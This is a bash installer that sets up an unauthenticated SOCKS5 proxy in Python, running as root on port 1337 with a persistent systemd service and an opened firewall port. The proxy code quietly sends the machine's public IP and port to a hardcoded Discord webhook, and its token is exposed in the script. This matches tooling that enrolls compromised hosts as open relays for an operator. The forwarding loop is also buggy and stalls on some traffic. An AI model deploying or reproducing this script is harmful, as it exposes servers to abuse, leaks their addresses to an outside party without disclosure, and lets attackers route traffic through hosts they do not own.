#!/bin/bash

# Install script for SOCKS5 Proxy on Debian
echo "[+] Installing SOCKS5 Proxy on Debian..."

# Install dependencies
apt update && apt install -y python3 python3-pip curl
pip3 install requests

# Create proper SOCKS5 proxy script
cat > /root/socks5_proxy.py << 'END_PYTHON'
import socket
import threading
import requests
import struct
import time

class RealSOCKS5Proxy:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.running = True

    def handle_client(self, client_socket, client_addr):
        try:
            print(f"[+] New connection from {client_addr[0]}:{client_addr[1]}")
            
            # SOCKS5 handshake
            version = client_socket.recv(1)
            if version != b'\x05':
                client_socket.close()
                return

            nmethods = client_socket.recv(1)[0]
            methods = client_socket.recv(nmethods)
            
            # Send method selection: No authentication
            client_socket.send(b'\x05\x00')
            
            # Read request
            request = client_socket.recv(4)
            if len(request) < 4:
                client_socket.close()
                return
                
            version, cmd, rsv, atype = request
            
            if cmd != 1:
                client_socket.send(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            if atype == 1:
                dest_addr = socket.inet_ntoa(client_socket.recv(4))
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            elif atype == 3:
                domain_length = client_socket.recv(1)[0]
                dest_addr = client_socket.recv(domain_length).decode()
                dest_port = int.from_bytes(client_socket.recv(2), 'big')
            else:
                client_socket.send(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                client_socket.close()
                return
            
            print(f"[+] Connecting to {dest_addr}:{dest_port}")
            
            try:
                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_socket.settimeout(30)
                remote_socket.connect((dest_addr, dest_port))
                
                local_addr, local_port = remote_socket.getsockname()
                
                response = b'\x05\x00\x00\x01' + socket.inet_aton(local_addr) + struct.pack('>H', local_port)
                client_socket.send(response)
                
                self.forward_data(client_socket, remote_socket)
                
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                client_socket.send(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            client_socket.close()

    def forward_data(self, client, remote):
        while self.running:
            try:
                data = client.recv(4096)
                if not data:
                    break
                remote.sendall(data)
                
                response = remote.recv(4096)
                if not response:
                    break
                client.sendall(response)
                
            except:
                break
        
        remote.close()

    def start(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(50)
        
        print(f'[+] Real SOCKS5 proxy started on {self.host}:{self.port}')
        
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=10).text
            webhook_data = {
                'content': f'✅ **DEBIAN SOCKS5 Proxy ONLINE**\n**IP:** `{public_ip}`\n**Port:** `1337`\n**Protocol:** SOCKS5\n**Status:** 🟢 Working',
                'username': 'Debian-Proxy'
            }
            requests.post(
                'https://discord.com/api/webhooks/1403000617143762985/89m4zh4QzJkk98ouY-2yUPr1L_TiN4WezeBOQ_zqTuHvDPx-RRFQRBzKiV0UpPsNIOzr',
                json=webhook_data,
                timeout=15
            )
        except Exception as e:
            print(f"[-] Discord notification failed: {e}")
        
        while self.running:
            try:
                client_socket, client_addr = sock.accept()
                thread = threading.Thread(target=self.handle_client, args=(client_socket, client_addr))
                thread.daemon = True
                thread.start()
            except Exception as e:
                print(f"[-] Accept error: {e}")
                break

if __name__ == "__main__":
    proxy = RealSOCKS5Proxy()
    proxy.start()
END_PYTHON

# Create systemd service
cat > /etc/systemd/system/socks5-proxy.service << 'END_SERVICE'
[Unit]
Description=Real SOCKS5 Proxy Service
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root
ExecStart=/usr/bin/python3 /root/socks5_proxy.py
Restart=always
RestartSec=5
TimeoutSec=30

[Install]
WantedBy=multi-user.target
END_SERVICE

# Fix permissions
chmod +x /root/socks5_proxy.py

# Reload and start service
systemctl daemon-reload
systemctl enable socks5-proxy.service
systemctl start socks5-proxy.service

# Check status
echo "[+] Installation complete!"
echo "[+] Checking status..."
systemctl status socks5-proxy.service --no-pager -l

# Open firewall if needed (ufw for Debian)
echo "[+] Opening firewall port 1337..."
ufw allow 1337/tcp 2>/dev/null || iptables -I INPUT -p tcp --dport 1337 -j ACCEPT

echo "[+] Proxy should be working now!"
echo "[+] Test with: curl --socks5 127.0.0.1:1337 http://ifconfig.me"
